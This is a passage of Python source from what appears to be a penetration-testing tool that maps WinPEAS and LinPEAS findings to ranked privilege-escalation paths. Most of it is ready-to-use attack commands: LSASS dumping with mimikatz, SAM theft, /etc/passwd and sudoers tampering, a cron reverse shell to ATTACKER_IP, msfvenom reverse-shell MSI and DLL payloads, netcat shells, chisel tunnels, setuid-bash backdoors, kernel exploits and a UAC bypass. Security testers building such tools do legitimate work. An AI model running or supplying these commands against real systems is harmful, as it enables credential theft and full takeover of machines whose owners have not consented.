                description="SeDebugPrivilege allows debugging any process including LSASS",
                finding="SeDebugPrivilege",
                commands=[
                    "# Dump LSASS for credential extraction:",
                    "procdump.exe -ma lsass.exe lsass.dmp",
                    "# Or use Task Manager -> lsass.exe -> Create dump file",
                    "# Then: mimikatz # sekurlsa::minidump lsass.dmp",
                    "# Or inject into a SYSTEM process:",
                    "# migrate to a SYSTEM-owned process (e.g., winlogon.exe)"
                ],
                confidence=Confidence.HIGH,
                risk=Risk.MEDIUM,
                references=["https://www.hackingarticles.in/windows-privilege-escalation-sedebugprivilege/"],
                reliability_score=90,
                safety_score=65,
                simplicity_score=75,
                stealth_score=30
            )
            paths.append(path)

        # SeLoadDriverPrivilege
        if "SeLoadDriverPrivilege" in all_privs:
            path = ExploitationPath(
                category=Category.TOKEN,
                technique_name="SeLoadDriverPrivilege Abuse",
                description="SeLoadDriverPrivilege allows loading kernel drivers for code execution",
                finding="SeLoadDriverPrivilege",
                commands=[
                    "# Load vulnerable Capcom.sys driver:",
                    "# 1. Download Capcom.sys and EoPLoadDriver",
                    "EoPLoadDriver.exe System\\CurrentControlSet\\MyService C:\\temp\\Capcom.sys",
                    "# 2. Run exploit to get SYSTEM shell via Capcom.sys",
                    "ExploitCapcom.exe"
                ],
                prerequisites=["Capcom.sys driver file", "EoPLoadDriver tool"],
                confidence=Confidence.MEDIUM,
                risk=Risk.HIGH,
                references=["https://github.com/TarlogicSecurity/EoPLoadDriver/"],
                reliability_score=70,
                safety_score=40,
                simplicity_score=50,
                stealth_score=20
            )
            paths.append(path)

        # SeTakeOwnershipPrivilege
        if "SeTakeOwnershipPrivilege" in all_privs:
            path = ExploitationPath(
                category=Category.TOKEN,
                technique_name="SeTakeOwnershipPrivilege Abuse",
                description="SeTakeOwnershipPrivilege allows taking ownership of any file",
                finding="SeTakeOwnershipPrivilege",
                commands=[
                    "# Take ownership of SAM file:",
                    r"takeown /f C:\Windows\System32\config\SAM",
                    r"icacls C:\Windows\System32\config\SAM /grant %username%:F",
                    r"copy C:\Windows\System32\config\SAM C:\temp\SAM",
                    "# Then extract hashes offline"
                ],
                confidence=Confidence.MEDIUM,
                risk=Risk.MEDIUM,
                references=["https://www.hackingarticles.in/windows-privilege-escalation-setakeownershipprivilege/"],
                reliability_score=75,
                safety_score=60,
                simplicity_score=75,
                stealth_score=30
            )
            paths.append(path)

        return paths

    def _analyze_services_windows(self, results: WinPEASResults) -> list[ExploitationPath]:
        """Analyze Windows services for privilege escalation."""
        paths = []

        for service in getattr(results, 'vulnerable_services', []):
            # Writable service binary
            if service.writable_binary:
                path = ExploitationPath(
                    category=Category.SERVICE,
                    technique_name=f"Writable Service Binary: {service.name}",
                    description="Service binary path is writable",
                    finding=service.binary_path,
                    commands=[
                        f"# Backup original: copy \"{service.binary_path}\" \"{service.binary_path}.bak\"",
                        "# Replace with malicious binary",
                        f"copy payload.exe \"{service.binary_path}\"",
                        f"sc stop {service.name}",
                        f"sc start {service.name}"
                    ],
                    confidence=Confidence.HIGH,
                    risk=Risk.MEDIUM,
                    reliability_score=90,
                    safety_score=70,
                    simplicity_score=80,
                    stealth_score=40
                )
                paths.append(path)

            # Unquoted service path
            if service.unquoted_path:
                path = ExploitationPath(
                    category=Category.SERVICE,
                    technique_name=f"Unquoted Service Path: {service.name}",
                    description="Service path is unquoted and contains spaces",
                    finding=service.binary_path,
                    commands=[
                        "# If path is: C:\\Program Files\\Some Dir\\binary.exe",
                        "# Try placing payload at: C:\\Program.exe",
                        "# Or: C:\\Program Files\\Some.exe",
                        f"sc stop {service.name}",
                        f"sc start {service.name}"
                    ],
                    prerequisites=["Write access to parent directory"],
                    confidence=Confidence.MEDIUM,
                    risk=Risk.MEDIUM,
                    reliability_score=70,
                    safety_score=70,
                    simplicity_score=60,
                    stealth_score=40
                )
                paths.append(path)

            # Weak service permissions
            if service.weak_permissions:
                path = ExploitationPath(
                    category=Category.SERVICE,
                    technique_name=f"Weak Service Permissions: {service.name}",
                    description="Service configuration can be modified",
                    finding=f"Service: {service.name}",
                    commands=[
                        f"sc config {service.name} binpath= \"cmd.exe /c net localgroup administrators USER /add\"",
                        f"sc stop {service.name}",
                        f"sc start {service.name}"
                    ],
                    confidence=Confidence.HIGH,
                    risk=Risk.MEDIUM,
                    reliability_score=85,
                    safety_score=65,
                    simplicity_score=85,
                    stealth_score=30
                )
                paths.append(path)

        return paths

    def _analyze_scheduled_tasks(self, results: WinPEASResults) -> list[ExploitationPath]:
        """Analyze Windows scheduled tasks."""
        paths = []

        for task in getattr(results, 'vulnerable_tasks', []):
            if task.writable_binary:
                path = ExploitationPath(
                    category=Category.SCHEDULED_TASK,
                    technique_name=f"Writable Scheduled Task: {task.name}",
                    description="Scheduled task runs a writable binary",
                    finding=task.binary_path,
                    commands=[
                        f"# Replace binary at: {task.binary_path}",
                        "# Wait for scheduled execution or trigger manually:",
                        f"schtasks /run /tn \"{task.name}\""
                    ],
                    confidence=Confidence.HIGH,
                    risk=Risk.LOW,
                    reliability_score=85,
                    safety_score=80,
                    simplicity_score=85,
                    stealth_score=50
                )
                paths.append(path)

        return paths

    def _analyze_kernel_windows(self, results: WinPEASResults) -> list[ExploitationPath]:
        """Analyze Windows version for kernel exploits."""
        paths: list[ExploitationPath] = []

        os_version = getattr(results, 'os_version', '')
        build_number = getattr(results, 'build_number', '')

        if not os_version:
            return paths

        windows_exploits = self._kernel_exploits.get("windows", {})

        for cve, exploit_info in windows_exploits.items():
            affected = exploit_info.get("affected_versions", {})
            affected_windows = affected.get("windows", [])

            # Check if current version is affected using version token extraction
            is_affected = False
            os_server = re.search(r'\b(2003|2008|2012|2016|2019|2022)\b', os_version)
            os_desktop = re.search(r'\bWindows\s+(7|8\.1|8|10|11)\b', os_version, re.IGNORECASE)
            for ver in affected_windows:
                ver_server = re.search(r'\b(2003|2008|2012|2016|2019|2022)\b', ver)
                ver_desktop = re.search(r'\b(7|8\.1|8|10|11)\b', ver)
                if os_server and ver_server and os_server.group(1) == ver_server.group(1):
                    is_affected = True
                    break
                if os_desktop and ver_desktop and os_desktop.group(1) == ver_desktop.group(1):
                    is_affected = True
                    break

            if is_affected:
                reliability = exploit_info.get("reliability", "medium")
                risk_level = exploit_info.get("risk", "medium")

                path = ExploitationPath(
                    category=Category.KERNEL,
                    technique_name=f"{exploit_info.get('name', cve)} ({cve})",
                    description=exploit_info.get("description", "Windows kernel exploit"),
                    finding=f"Windows {os_version} (Build: {build_number})",
                    commands=exploit_info.get("commands", []),
                    prerequisites=exploit_info.get("requirements", []),
                    confidence=Confidence.HIGH if reliability == "high" else Confidence.MEDIUM,
                    risk=Risk.LOW if risk_level == "low" else Risk.MEDIUM if risk_level == "medium" else Risk.HIGH,
                    references=exploit_info.get("exploit_sources", []),
                    notes=exploit_info.get("notes", ""),
                    reliability_score=90 if reliability == "high" else 60,
                    safety_score=85 if risk_level == "low" else 60,
                    simplicity_score=70,
                    stealth_score=40
                )
                paths.append(path)

        return paths

    def _analyze_registry(self, results: WinPEASResults) -> list[ExploitationPath]:
        """Analyze Windows registry for escalation vectors."""
        paths = []

        # AlwaysInstallElevated
        if getattr(results, 'always_install_elevated', False):
            path = ExploitationPath(
                category=Category.REGISTRY,
                technique_name="AlwaysInstallElevated",
                description="MSI packages install with elevated privileges",
                finding="HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer\\AlwaysInstallElevated = 1",
                commands=[
                    "# Generate malicious MSI:",
                    "msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=LPORT -f msi -o evil.msi",
                    "# Install MSI:",
                    "msiexec /quiet /qn /i evil.msi"
                ],
                confidence=Confidence.HIGH,
                risk=Risk.LOW,
                reliability_score=95,
                safety_score=85,
                simplicity_score=90,
                stealth_score=50
            )
            paths.append(path)

        # AutoLogon credentials
        if getattr(results, 'autologon_creds', None):
            creds: dict = results.autologon_creds  # type: ignore[assignment]
            path = ExploitationPath(
                category=Category.CREDENTIALS,
                technique_name="AutoLogon Credentials",
                description="Credentials stored in registry for automatic logon",
                finding=f"User: {creds.get('user', 'Unknown')}",
                commands=[
                    f"# Username: {creds.get('user', '')}",
                    f"# Password: {creds.get('password', '')}",
                    "# Try: runas /user:DOMAIN\\USER cmd.exe"
                ],
                confidence=Confidence.HIGH,
                risk=Risk.LOW,
                reliability_score=100,
                safety_score=100,
                simplicity_score=100,
                stealth_score=90
            )
            paths.append(path)

        return paths

    def _analyze_credentials_linux(self, results: LinPEASResults) -> list[ExploitationPath]:
        """Analyze credential files found on Linux systems."""
        paths: list[ExploitationPath] = []

        # SSH keys
        for key in getattr(results, 'ssh_keys', []):
            path = ExploitationPath(
                category=Category.CREDENTIALS,
                technique_name="SSH Private Key",
                description=f"SSH private key found: {key}",
                finding=key,
                commands=[
                    f"chmod 600 {key}",
                    f"ssh -i {key} root@localhost",
                    f"# Or try other users: ssh -i {key} <user>@localhost"
                ],
                confidence=Confidence.HIGH,
                risk=Risk.LOW,
                reliability_score=85,
                safety_score=95,
                simplicity_score=90,
                stealth_score=80
            )
            paths.append(path)

        # Password files
        for pfile in getattr(results, 'password_files', []):
            path = ExploitationPath(
                category=Category.CREDENTIALS,
                technique_name="Password File",
                description=f"Password file found: {pfile}",
                finding=pfile,
                commands=[
                    f"cat {pfile}",
                    "# Try extracted credentials:",
                    "su root",
                    "# Or for database credentials:",
                    "mysql -u root -p<password>"
                ],
                confidence=Confidence.MEDIUM,
                risk=Risk.LOW,
                reliability_score=70,
                safety_score=95,
                simplicity_score=85,
                stealth_score=75
            )
            paths.append(path)

        # Config files with potential credentials
        high_value_configs = [
            "wp-config.php", ".env", "config.php", "database.yml",
            "db.php", "settings.py", "application.properties",
        ]
        for cfile in getattr(results, 'config_files', []):
            filename = Path(cfile).name.lower()
            if any(hv in filename for hv in high_value_configs):
                path = ExploitationPath(
                    category=Category.CREDENTIALS,
                    technique_name="Config File Credentials",
                    description=f"Configuration file may contain credentials: {cfile}",
                    finding=cfile,
                    commands=[
                        f"cat {cfile}",
                        f"grep -i 'pass\\|secret\\|key\\|token\\|db_' {cfile}",
                        "# Try extracted credentials with su or service logins"
                    ],
                    confidence=Confidence.MEDIUM,
                    risk=Risk.LOW,
                    reliability_score=65,
                    safety_score=95,
                    simplicity_score=90,
                    stealth_score=80
                )
                paths.append(path)

        return paths

    def _analyze_network_services(self, results: LinPEASResults) -> list[ExploitationPath]:
        """Analyze network services for privilege escalation opportunities."""
        paths: list[ExploitationPath] = []

        # Known port -> service mapping
        port_service_map = {
            3306: "MySQL",
            5432: "PostgreSQL",
            6379: "Redis",
            27017: "MongoDB",
            8080: "Web (HTTP)",
            8443: "Web (HTTPS)",
            9090: "Web Admin",
            11211: "Memcached",
        }

        for svc in getattr(results, 'network_services', []):
            local_addr = getattr(svc, 'local_address', '')
            local_port = getattr(svc, 'local_port', 0)
            program = getattr(svc, 'program', '')
            pid = getattr(svc, 'pid', '')

            # Flag services bound to localhost only (internal-only)
            is_internal = local_addr in ('127.0.0.1', '::1', 'localhost')
            if not is_internal:
                continue

            service_name = port_service_map.get(local_port, f"Unknown (port {local_port})")

            commands = [
                f"# Internal service: {service_name} on {local_addr}:{local_port}",
                "# SSH local port forward:",
                f"ssh -L {local_port}:127.0.0.1:{local_port} user@ATTACKER_IP",
                "# Chisel (on attacker: chisel server -p 8000 --reverse):",
                f"./chisel client ATTACKER_IP:8000 R:{local_port}:127.0.0.1:{local_port}",
                "# Socat:",
                f"socat TCP-LISTEN:{local_port},fork TCP:127.0.0.1:{local_port} &",
                f"# Then connect locally to 127.0.0.1:{local_port}"
            ]

            # Add service-specific commands
            if local_port == 3306:
                commands.append("mysql -u root -h 127.0.0.1 -p")
            elif local_port == 5432:
                commands.append("psql -U postgres -h 127.0.0.1")
            elif local_port == 6379:
                commands.append("redis-cli -h 127.0.0.1")
            elif local_port == 27017:
                commands.append("mongo --host 127.0.0.1")
            elif local_port == 11211:
                commands.append("echo 'stats' | nc 127.0.0.1 11211")

            notes_parts = []
            if program:
                notes_parts.append(f"Program: {program}")
            if pid:
                notes_parts.append(f"PID: {pid}")

            path = ExploitationPath(
                category=Category.NETWORK,
                technique_name=f"Internal Service: {service_name}",
                description=f"{service_name} bound to {local_addr}:{local_port} - internal only, may have weak auth",
                finding=f"{local_addr}:{local_port} ({service_name})",
                commands=commands,
                confidence=Confidence.MEDIUM,
                risk=Risk.LOW,
                notes=", ".join(notes_parts) if notes_parts else "",
                reliability_score=60,
                safety_score=90,
                simplicity_score=70,
                stealth_score=70
            )
            paths.append(path)

        return paths

    def _analyze_writable_files(self, results: LinPEASResults) -> list[ExploitationPath]:
        """Analyze writable critical files and directories."""
        paths: list[ExploitationPath] = []

        # Collect all writable file paths from both sources
        writable_paths: list[str] = []
        for wf in getattr(results, 'writable_files', []):
            writable_paths.append(getattr(wf, 'path', str(wf)))
        for wd in getattr(results, 'writable_dirs', []):
            writable_paths.append(wd if isinstance(wd, str) else str(wd))

        # Critical file checks
        critical_checks: dict[str, dict] = {
            "/etc/passwd": {
                "category": Category.CREDENTIALS,
                "technique": "Writable /etc/passwd",
                "description": "World-writable /etc/passwd allows adding root user",
                "commands": [
                    "openssl passwd -1 -salt xyz password123",
                    '# Add root user: echo "hacker:$1$xyz$hash:0:0::/root:/bin/bash" >> /etc/passwd',
                    "su hacker"
                ],
                "confidence": Confidence.HIGH,
                "risk": Risk.LOW,
                "reliability": 95,
                "safety": 80,
                "simplicity": 90,
            },
            "/etc/shadow": {
                "category": Category.CREDENTIALS,
                "technique": "Writable /etc/shadow",
                "description": "World-writable /etc/shadow allows replacing root password hash",
                "commands": [
                    "# Generate new password hash:",
                    "openssl passwd -6 -salt xyz password123",
                    "# Replace root's hash in /etc/shadow with the generated hash",
                    "# Then: su root (password: password123)"
                ],
                "confidence": Confidence.HIGH,
                "risk": Risk.MEDIUM,
                "reliability": 90,
                "safety": 65,
                "simplicity": 80,
            },
            "/etc/sudoers": {
                "category": Category.SUDO,
                "technique": "Writable /etc/sudoers",
                "description": "World-writable /etc/sudoers allows granting sudo access",
                "commands": [
                    '# Add current user to sudoers:',
                    'echo "<user> ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers',
                    "sudo /bin/bash"
                ],
                "confidence": Confidence.HIGH,
                "risk": Risk.LOW,
                "reliability": 95,
                "safety": 80,
                "simplicity": 95,
            },
            "/etc/crontab": {
                "category": Category.CRON,
                "technique": "Writable /etc/crontab",
                "description": "World-writable /etc/crontab allows adding malicious cron jobs",
                "commands": [
                    '# Add reverse shell cron:',
                    'echo "* * * * * root /bin/bash -i >& /dev/tcp/ATTACKER_IP/LPORT 0>&1" >> /etc/crontab',
                    "# Or: echo '* * * * * root cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' >> /etc/crontab"
                ],
                "confidence": Confidence.HIGH,
                "risk": Risk.MEDIUM,
                "reliability": 90,
                "safety": 70,
                "simplicity": 85,
            },
        }

        # Directories that indicate systemd unit writability
        systemd_dirs = [
            "/etc/systemd/system",
            "/usr/lib/systemd/system",
            "/lib/systemd/system",
        ]

        # Root dotfiles
        root_dotfiles = ["/root/.bashrc", "/root/.profile", "/root/.bash_profile"]

        for wp in writable_paths:
            # Check critical files
            if wp in critical_checks:
                cc = critical_checks[wp]
                path = ExploitationPath(
                    category=cc["category"],  # type: ignore[arg-type]
                    technique_name=str(cc["technique"]),
                    description=str(cc["description"]),
                    finding=wp,
                    commands=list(cc["commands"]),  # type: ignore[arg-type]
                    confidence=cc["confidence"],  # type: ignore[arg-type]
                    risk=cc["risk"],  # type: ignore[arg-type]
                    reliability_score=int(cc["reliability"]),
                    safety_score=int(cc["safety"]),
                    simplicity_score=int(cc["simplicity"]),
                    stealth_score=40
                )
                paths.append(path)

            # Check systemd unit directories
            for sd in systemd_dirs:
                if wp == sd or wp.startswith(sd + "/"):
                    path = ExploitationPath(
                        category=Category.SERVICE,
                        technique_name="Writable Systemd Unit Directory",
                        description=f"Writable systemd directory allows creating malicious services: {wp}",
                        finding=wp,
                        commands=[
                            f"# Create malicious service in {wp}:",
                            f"cat > {sd}/evil.service << 'EOF'",
                            "[Unit]",
                            "Description=Evil Service",
                            "[Service]",
                            "ExecStart=/bin/bash -c 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash'",
                            "[Install]",
                            "WantedBy=multi-user.target",
                            "EOF",
                            "systemctl daemon-reload",
                            "systemctl start evil.service",
                            "/tmp/rootbash -p"
                        ],
                        confidence=Confidence.HIGH,
                        risk=Risk.MEDIUM,
                        reliability_score=85,
                        safety_score=65,
                        simplicity_score=75,
                        stealth_score=30
                    )
                    paths.append(path)
                    break  # Only add once per writable path

            # Check root dotfiles
            if wp in root_dotfiles:
                path = ExploitationPath(
                    category=Category.WRITABLE_FILE,
                    technique_name=f"Writable {Path(wp).name}",
                    description=f"Writable root dotfile allows command injection on root login: {wp}",
                    finding=wp,
                    commands=[
                        f"# Append payload to {wp}:",
                        f"echo 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' >> {wp}",
                        "# Wait for root to log in, then:",
                        "/tmp/rootbash -p"
                    ],
                    confidence=Confidence.MEDIUM,
                    risk=Risk.LOW,
                    reliability_score=65,
                    safety_score=80,
                    simplicity_score=85,
                    stealth_score=40
                )
                paths.append(path)

        return paths

    def _analyze_sgid(self, results: LinPEASResults) -> list[ExploitationPath]:
        """Analyze SGID binaries."""
        paths: list[ExploitationPath] = []

        # High-value group ownership for SGID binaries
        high_value_groups = {
            "shadow": {
                "description": "SGID shadow group - can read /etc/shadow",
                "commands": ["cat /etc/shadow", "# Crack hashes with john or hashcat"],
            },
            "disk": {
                "description": "SGID disk group - raw disk access via debugfs",
                "commands": ["debugfs /dev/sda1", "# In debugfs: cat /etc/shadow"],
            },
            "adm": {
                "description": "SGID adm group - can read log files",
                "commands": ["cat /var/log/auth.log | grep -i pass", "cat /var/log/syslog"],
            },
            "video": {
                "description": "SGID video group - screen capture access",
                "commands": ["cat /dev/fb0 > /tmp/screenshot.raw", "# Convert with ffmpeg or similar"],
            },
        }

        for sgid in getattr(results, 'sgid_binaries', []):
            binary_name = Path(sgid.path).name
            group = getattr(sgid, 'group', '')

            # Check GTFOBins (same as SUID)
            if binary_name in self._gtfobins:
                gtfo = self._gtfobins[binary_name]

                if "suid" in gtfo:
                    suid_info = gtfo["suid"]
                    commands = []
                    for cmd in suid_info.get("commands", []):
                        actual_cmd = cmd.replace(f"./{binary_name}", _safe_path(sgid.path))
                        commands.append(actual_cmd)

                    path = ExploitationPath(
                        category=Category.SUID,
                        technique_name=f"SGID {binary_name}",
                        description=suid_info.get("description", f"Exploit SGID bit on {binary_name}"),
                        finding=sgid.path,
                        commands=commands,
                        confidence=Confidence.HIGH,
                        risk=Risk.LOW,
                        references=[f"https://gtfobins.github.io/gtfobins/{binary_name}/#suid"],
                        reliability_score=85,
                        safety_score=85,
                        simplicity_score=85,
                        stealth_score=65
                    )
                    paths.append(path)

            # Check for high-value group ownership
            if group in high_value_groups:
                hv_info = high_value_groups[group]
                path = ExploitationPath(
                    category=Category.SUID,
                    technique_name=f"SGID {binary_name} ({group} group)",
                    description=str(hv_info["description"]),
                    finding=f"{sgid.path} (group: {group})",
                    commands=list(hv_info["commands"]),
                    confidence=Confidence.MEDIUM,
                    risk=Risk.LOW,
                    reliability_score=75,
                    safety_score=85,
                    simplicity_score=80,
                    stealth_score=60
                )
                paths.append(path)

        return paths

    def _analyze_groups(self, results: LinPEASResults) -> list[ExploitationPath]:
        """Analyze user group memberships for privilege escalation."""
        paths: list[ExploitationPath] = []

        # Get groups - handle both list and string formats defensively
        raw_groups = getattr(results, 'current_groups', [])
        if isinstance(raw_groups, str):
            groups = [g.strip() for g in raw_groups.split(',') if g.strip()]
        else:
            groups = list(raw_groups)

        # Dangerous groups and their exploitation paths
        # Note: docker/lxd already handled by _analyze_docker
        group_exploits = {
            "disk": {
                "technique": "Disk Group - Raw Disk Access",
                "description": "Member of disk group - can read raw disk data with debugfs",
                "commands": [
                    "debugfs /dev/sda1",
                    "# In debugfs shell:",
                    "cat /etc/shadow",
                    "cat /root/.ssh/id_rsa"
                ],
                "confidence": Confidence.HIGH,
                "risk": Risk.LOW,
            },
            "adm": {
                "technique": "Adm Group - Log File Access",
                "description": "Member of adm group - can read system logs for credentials",
                "commands": [
                    "cat /var/log/auth.log | grep -i pass",
                    "cat /var/log/syslog | grep -i password",
                    "find /var/log -readable -type f -exec grep -li 'pass\\|credential\\|secret' {} \\;"
                ],
                "confidence": Confidence.MEDIUM,
                "risk": Risk.LOW,
            },
            "shadow": {
                "technique": "Shadow Group - Password Hash Access",
                "description": "Member of shadow group - can read /etc/shadow for password hashes",
                "commands": [
                    "cat /etc/shadow",
                    "# Crack hashes with john:",
                    "john --wordlist=/usr/share/wordlists/rockyou.txt shadow_hashes.txt",
                    "# Or with hashcat:",
                    "hashcat -m 1800 shadow_hashes.txt wordlist.txt"
                ],
                "confidence": Confidence.HIGH,
                "risk": Risk.LOW,
            },
            "staff": {
                "technique": "Staff Group - PATH Hijack via /usr/local",
                "description": "Member of staff group - can write to /usr/local/bin for PATH hijack",
                "commands": [
                    "# Create malicious binary in /usr/local/bin:",
                    "echo '#!/bin/bash\\ncp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' > /usr/local/bin/<target_cmd>",
                    "chmod +x /usr/local/bin/<target_cmd>",
                    "# Wait for root to execute the command"
                ],
                "confidence": Confidence.MEDIUM,
                "risk": Risk.LOW,
            },
            "video": {
                "technique": "Video Group - Screen Capture",
                "description": "Member of video group - can capture screen contents",
                "commands": [
                    "cat /dev/fb0 > /tmp/screenshot.raw",
                    "# Get screen resolution:",
                    "cat /sys/class/graphics/fb0/virtual_size",
                    "# Convert raw to image with ffmpeg or Python PIL"
                ],
                "confidence": Confidence.LOW,
                "risk": Risk.LOW,
            },
            "root": {
                "technique": "Root Group Membership",
                "description": "Member of root group - may have access to root-owned files",
                "commands": [
                    "find / -group root -writable 2>/dev/null",
                    "# Check for readable sensitive files:",
                    "cat /etc/shadow 2>/dev/null"
                ],
                "confidence": Confidence.HIGH,
                "risk": Risk.LOW,
            },
            "wheel": {
                "technique": "Wheel Group - Sudo Access",
                "description": "Member of wheel group - typically grants sudo access",
                "commands": [
                    "sudo -l",
                    "sudo su",
                    "sudo /bin/bash"
                ],
                "confidence": Confidence.HIGH,
                "risk": Risk.LOW,
            },
            "sudo": {
                "technique": "Sudo Group - Sudo Access",
                "description": "Member of sudo group - grants sudo access",
                "commands": [
                    "sudo -l",
                    "sudo su",
                    "sudo /bin/bash"
                ],
                "confidence": Confidence.HIGH,
                "risk": Risk.LOW,
            },
            "admin": {
                "technique": "Admin Group - Administrative Access",
                "description": "Member of admin group - may grant sudo or direct root access",
                "commands": [
                    "sudo -l",
                    "sudo su"
                ],
                "confidence": Confidence.HIGH,
                "risk": Risk.LOW,
            },
        }

        for group in groups:
            group_lower = group.lower()
            if group_lower in group_exploits:
                ge = group_exploits[group_lower]
                ge_commands: list[str] = ge["commands"]  # type: ignore[assignment]
                ge_confidence: Confidence = ge["confidence"]  # type: ignore[assignment]
                ge_risk: Risk = ge.get("risk", Risk.LOW)  # type: ignore[assignment]
                path = ExploitationPath(
                    category=Category.GROUP,
                    technique_name=str(ge["technique"]),
                    description=str(ge["description"]),
                    finding=f"Group membership: {group}",
                    commands=ge_commands,
                    confidence=ge_confidence,
                    risk=ge_risk,
                    reliability_score=85,
                    safety_score=90,
                    simplicity_score=85,
                    stealth_score=70
                )
                paths.append(path)

        return paths

    def _analyze_dll_hijack(self, results: WinPEASResults) -> list[ExploitationPath]:
        """Analyze Windows services for DLL hijacking opportunities."""
        paths: list[ExploitationPath] = []

        writable_dirs = {d.lower() for d in getattr(results, 'writable_paths', [])}

        for service in getattr(results, 'services', []):
            binary_path = getattr(service, 'binary_path', '')
            if not binary_path:
                continue

            # Extract directory from binary path
            clean_path = binary_path.strip('"').strip("'")
            try:
                binary_dir = str(Path(clean_path).parent).lower()
            except (ValueError, OSError):
                continue

            # Check if the binary's directory is writable
            if binary_dir in writable_dirs:
                svc_name = getattr(service, 'name', 'Unknown')
                path = ExploitationPath(
                    category=Category.DLL,
                    technique_name=f"DLL Hijack: {svc_name}",
                    description=f"Service {svc_name} binary is in writable directory - DLL hijacking possible",
                    finding=f"{svc_name}: {binary_path} (writable dir: {binary_dir})",
                    commands=[
                        "# Generate malicious DLL:",
                        "msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=LPORT -f dll -o hijack.dll",
                        f"# Place DLL in: {binary_dir}",
                        "# Common DLL names to hijack: version.dll, wer.dll, dbghelp.dll",
                        f"copy hijack.dll \"{binary_dir}\\version.dll\"",
                        f"sc stop {svc_name}",
                        f"sc start {svc_name}"
                    ],
                    prerequisites=["Write access to service binary directory"],
                    confidence=Confidence.MEDIUM,
                    risk=Risk.MEDIUM,
                    reliability_score=65,
                    safety_score=60,
                    simplicity_score=60,
                    stealth_score=40
                )
                paths.append(path)

        return paths

    def _analyze_missing_patches(self, results: WinPEASResults) -> list[ExploitationPath]:
        """Analyze missing Windows patches for known exploits."""
        paths: list[ExploitationPath] = []

        # MS patch ID -> exploit info mapping
        patch_exploits = {
            "MS16-032": {
                "name": "Secondary Logon Handle",
                "description": "Secondary Logon Handle privilege escalation",
                "commands": [
                    "# PowerShell exploit:",
                    "Invoke-MS16032.ps1",
                    "# Or Metasploit:",
                    "use exploit/windows/local/ms16_032_secondary_logon_handle_privesc"
                ],
                "reliability": "high",
                "references": ["https://www.exploit-db.com/exploits/39719"],
            },
            "MS14-058": {
                "name": "TrackPopupMenu Win32k",
                "description": "Win32k.sys TrackPopupMenu privilege escalation",
                "commands": [
                    "# Metasploit:",
                    "use exploit/windows/local/ms14_058_track_popup_menu",
                    "set SESSION <session_id>",
                    "run"
                ],
                "reliability": "high",
                "references": ["https://www.exploit-db.com/exploits/35101"],
            },
            "MS15-051": {
                "name": "Client Copy Image",
                "description": "Win32k.sys ClientCopyImage privilege escalation",
                "commands": [
                    "ms15-051x64.exe whoami",
                    "# For reverse shell:",
                    "ms15-051x64.exe \"cmd.exe /c net localgroup administrators USER /add\""
                ],
                "reliability": "high",
                "references": ["https://www.exploit-db.com/exploits/37049"],
            },
            "MS10-059": {
                "name": "Chimichurri",
                "description": "Chimichurri privilege escalation via AFD.sys",
                "commands": [
                    "chimichurri.exe ATTACKER_IP LPORT"
                ],
                "reliability": "medium",
                "references": ["https://github.com/egre55/windows-kernel-exploits"],
            },
            "MS16-075": {
                "name": "Rotten Potato",
                "description": "Rotten Potato token impersonation",
                "commands": [
                    "rottenpotato.exe",
                    "# Requires SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege"
                ],
                "reliability": "medium",
                "references": ["https://github.com/foxglovesec/RottenPotato"],
            },
            "MS10-015": {
                "name": "KiTrap0D",
                "description": "KiTrap0D kernel trap handler privilege escalation",
                "commands": [
                    "vdmallowed.exe",
                    "# Spawns SYSTEM shell"
                ],
                "reliability": "medium",
                "references": ["https://www.exploit-db.com/exploits/11199"],
            },
            "MS11-046": {
                "name": "AFD.sys",
                "description": "AFD.sys local privilege escalation",
                "commands": [
                    "ms11-046.exe",
                    "# Spawns SYSTEM shell"
                ],
                "reliability": "medium",
                "references": ["https://www.exploit-db.com/exploits/40564"],
            },
            "MS09-012": {
                "name": "Churrasco",
                "description": "Churrasco token kidnapping privilege escalation",
                "commands": [
                    "churrasco.exe \"cmd.exe /c net localgroup administrators USER /add\"",
                    "# Or for reverse shell:",
                    "churrasco.exe \"nc.exe -e cmd.exe ATTACKER_IP LPORT\""
                ],
                "reliability": "medium",
                "references": ["https://github.com/Re4son/Churrasco"],
            },
        }

        for patch in getattr(results, 'missing_patches', []):
            ms_id = patch.get("id", "") if isinstance(patch, dict) else str(patch)
            if ms_id in patch_exploits:
                info = patch_exploits[ms_id]
                reliability = info.get("reliability", "medium")

                confidence = Confidence.HIGH if reliability == "high" else Confidence.MEDIUM
                reliability_score = 85 if reliability == "high" else 65

                path = ExploitationPath(
                    category=Category.KERNEL,
                    technique_name=f"{info['name']} ({ms_id})",
                    description=str(info["description"]),
                    finding=f"Missing patch: {ms_id}",
                    commands=list(info["commands"]),  # type: ignore[arg-type]
                    confidence=confidence,
                    risk=Risk.MEDIUM,
                    references=list(info.get("references", [])),  # type: ignore[arg-type]
                    reliability_score=reliability_score,
                    safety_score=60,
                    simplicity_score=70,
                    stealth_score=40
                )
                paths.append(path)

        return paths

    def _analyze_uac(self, results: WinPEASResults) -> list[ExploitationPath]:
        """Analyze UAC bypass opportunities on Windows."""
        paths: list[ExploitationPath] = []

        integrity_level = getattr(results, 'integrity_level', '')
        user_info = getattr(results, 'user_info', None)

        # Check if we're at Medium integrity with admin group membership
        is_medium_integrity = integrity_level.lower() == "medium" if integrity_level else False

        # Check if user is in Administrators group
        is_admin = False
        if user_info:
            user_groups = getattr(user_info, 'groups', [])
            for g in user_groups:
                if 'admin' in g.lower():
                    is_admin = True
                    break

        if not (is_medium_integrity and is_admin):
            # If we can't confirm both conditions, still suggest if integrity is medium
            # (user might be admin but we can't confirm from parsed data)
            if not is_medium_integrity:
                return paths

        uac_techniques = {
            "fodhelper.exe": {
                "description": "UAC bypass via fodhelper.exe registry hijack",
                "commands": [
                    "# Set registry key:",
                    "reg add HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command /d \"cmd.exe /c start cmd.exe\" /f",
                    "reg add HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command /v DelegateExecute /t REG_SZ /f",
                    "# Trigger:",
                    "fodhelper.exe",
                    "# Cleanup:",
